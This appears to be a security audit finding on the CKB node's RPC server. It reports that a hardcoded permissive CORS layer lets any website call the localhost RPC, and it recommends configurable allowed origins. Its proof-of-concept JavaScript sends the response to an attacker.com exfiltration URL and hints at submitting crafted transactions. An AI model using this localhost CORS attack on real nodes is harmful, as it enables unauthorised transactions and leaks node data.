### Title
Hardcoded `CorsLayer::permissive()` Allows Any Web Origin to Cross-Origin Access the CKB RPC Server — (File: `rpc/src/server.rs`)

---

### Summary

The CKB RPC HTTP/WebSocket server unconditionally applies `CorsLayer::permissive()`, which sets `Access-Control-Allow-Origin: *` for every response. There is no configuration option to restrict allowed origins. Any web page — including a malicious site visited by a node operator — can make cross-origin requests to the CKB RPC (including to `http://localhost:8114`) and invoke any enabled RPC method without restriction.

---

### Finding Description

In `rpc/src/server.rs`, the `start_server` function builds the Axum router and unconditionally attaches a fully permissive CORS layer:

```rust
let app = Router::new()
    .route("/", method_router.clone())
    .route("/{*path}", method_router)
    .route("/ping", get(ping_handler))
    .layer(Extension(Arc::clone(rpc)))
    .layer(CorsLayer::permissive())   // ← hardcoded, no config
    ...
``` [1](#0-0) 

`CorsLayer::permissive()` from `tower-http` responds to every preflight and actual request with `Access-Control-Allow-Origin: *`, `Access-Control-Allow-Methods: *`, and `Access-Control-Allow-Headers: *`. This is applied to both the HTTP server and the WebSocket server (both call `start_server`). [2](#0-1) 

The `RpcConfig` struct has no `allowed_origins`, `cors_origins`, or any CORS-related field whatsoever: [3](#0-2) 

There is no code path that narrows the CORS policy — `grep` across the entire repository finds `CorsLayer` only in `server.rs` and only as `permissive()`.

---

### Impact Explanation

The CKB RPC exposes sensitive and state-mutating methods. With `CorsLayer::permissive()`, a browser will honor the wildcard `Access-Control-Allow-Origin: *` response and allow any web page to read the full RPC response body. Since the CKB RPC requires no authentication tokens or cookies, the browser's credential-blocking rule for `*` origins is irrelevant — the attacker needs no credentials.

A malicious web page visited by a node operator can:

- **Submit arbitrary transactions** via `send_transaction` (Pool module, enabled by default).
- **Manipulate the tx pool** via `remove_transaction`, `clear_tx_pool`.
- **Manipulate peer connections** via `add_node`, `remove_node`, `ban_address` (Net module, enabled by default).
- **Retrieve block templates and submit mining work** via `get_block_template` / `submit_block` (Miner module, enabled by default).
- **Access sensitive node state** (peer list, banned addresses, chain tip, etc.).

The default `listen_address = "127.0.0.1:8114"` does not mitigate this: browsers can freely make cross-origin requests to `http://localhost:8114` — this is the canonical "localhost CORS attack" vector. [4](#0-3) 

---

### Likelihood Explanation

The attack requires only that a CKB node operator visits a malicious (or compromised) web page while their node is running — a realistic and common scenario. No special privileges, leaked keys, or network access beyond the browser are required. The RPC is enabled and bound to localhost by default in every standard CKB deployment.

---

### Recommendation

1. Add an `allowed_origins: Vec<String>` field to `RpcConfig` in `util/app-config/src/configs/rpc.rs`.
2. In `start_server` in `rpc/src/server.rs`, replace `CorsLayer::permissive()` with a `CorsLayer` that only allows the configured origins. Default the list to an empty set (deny all cross-origin) or `["http://localhost:8114"]` (self-only).
3. Validate each configured origin: require `https://` scheme for non-localhost origins, reject wildcard subdomains, and reject malformed URIs.
4. Document the `allowed_origins` option in `resource/ckb.toml` with a clear security warning.

---

### Proof of Concept

With a CKB node running at default settings, the following JavaScript executed from **any** web page (e.g., `https://attacker.com`) will successfully cross-origin-read the chain tip number:

```javascript
fetch("http://localhost:8114", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    id: 1,
    jsonrpc: "2.0",
    method: "get_tip_block_number",
    params: []
  })
})
.then(r => r.json())
.then(data => {
  // data.result contains the tip block number — full response readable cross-origin
  // Replace method with "send_transaction" + params to submit attacker-crafted tx
  fetch("https://attacker.com/exfil?tip=" + data.result);
});
```

The browser sends the preflight `OPTIONS` request; the CKB server responds with `Access-Control-Allow-Origin: *`; the browser proceeds with the actual `POST`; the full JSON-RPC response is readable by the attacker's script. No user interaction beyond visiting the page is required. [5](#0-4)
